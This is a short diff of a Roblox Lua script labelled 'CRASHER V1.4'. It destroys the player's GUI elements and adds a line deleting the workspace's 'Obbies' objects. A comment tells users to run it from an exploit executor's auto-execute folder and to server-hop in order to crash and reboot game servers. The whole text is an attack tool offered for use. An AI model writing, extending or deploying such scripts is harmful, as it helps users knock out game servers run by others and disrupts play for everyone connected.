@@ -2,6 +2,7 @@ coroutine.wrap(function()
 for i,v in next, game.Players.LocalPlayer.PlayerGui:GetChildren() do
   v:Destroy()
 end
+workspace.Obbies:Destroy()
 end)()
 -- place script in auto execute folder it server hop for more chance of crashing the server (rebooting it)
 -- CRASHER V1.4
